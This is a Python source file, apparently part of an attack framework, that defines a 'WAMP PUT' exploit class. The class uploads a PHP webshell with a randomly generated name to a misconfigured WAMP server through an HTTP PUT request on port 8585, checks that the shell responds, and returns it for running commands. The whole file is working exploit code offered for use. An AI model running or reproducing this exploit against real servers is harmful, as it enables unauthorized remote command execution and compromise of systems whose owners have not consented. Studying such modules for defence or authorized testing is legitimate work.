#######################################################
# WAMP PUT
# (not a CVE/Metasploit module)
#
# This exploit takes advantage of the misconfigured
# WAMP server to upload arbitrary files directly to 
# deliver a webshell.
#######################################################

from utils import Exploit
import requests
import random, string
from shells.webshell import WebShell

class WAMPPUT(Exploit):
    '''Class to perform WAMP PUT exploit'''

    def __init__(self, server_ip: str):
        super().__init__(
            os='windows',
            name='WAMP PUT',
            description='',
            requirements=['http/8585'],
            webserver=False,
            server_ip=server_ip
        )
    
    def attack(self, target: str):
        '''Perform the attack on a target and return a webshell'''
        # Prepare payload
        webshell_name = ''.join(random.choice(string.ascii_letters) for _ in range(5)) + '.php'
        url = f'http://{target}:8585/uploads/{webshell_name}'
        
        # Send payload
        self.message(target, 'Sending malicious request...')
        try:
            r = requests.put(url, data=WebShell.WINDOWS_CODE)
        except OSError:
            self.error(target, 'Could not connect to webserver.')
            return
        except Exception as e:
            self.error(target, 'An unknown error occured: ' + str(e))
            return
        
        webshell = WebShell(target, self.os, url)
        self.message(target, f'Created webshell at {url}')

        # Test if webshell works
        if webshell.cmd(''):
            # Return webshell
            self.success(target)
            return webshell
        else:
           webshell.kill()
           return
